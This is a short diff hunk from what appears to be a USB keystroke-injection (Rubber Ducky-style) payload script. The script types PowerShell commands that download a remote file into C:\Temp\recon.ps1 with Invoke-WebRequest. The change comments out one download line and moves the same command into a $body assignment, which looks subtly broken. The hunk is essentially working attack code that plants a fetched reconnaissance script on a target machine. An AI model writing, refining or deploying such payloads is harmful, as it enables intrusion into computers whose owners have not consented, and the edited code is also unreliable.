@@ -21,8 +21,8 @@ STRING $p="C:\Temp\recon.ps1"
 ENTER
 DELAY 300
 
-STRING Invoke-WebRequest -Uri $u -OutFile $p
-STRING $body = $p
+REM STRING Invoke-WebRequest -Uri $u -OutFile $p
+STRING $body = Invoke-WebRequest -Uri $u -OutFile $p
 ENTER
 DELAY 1500
 
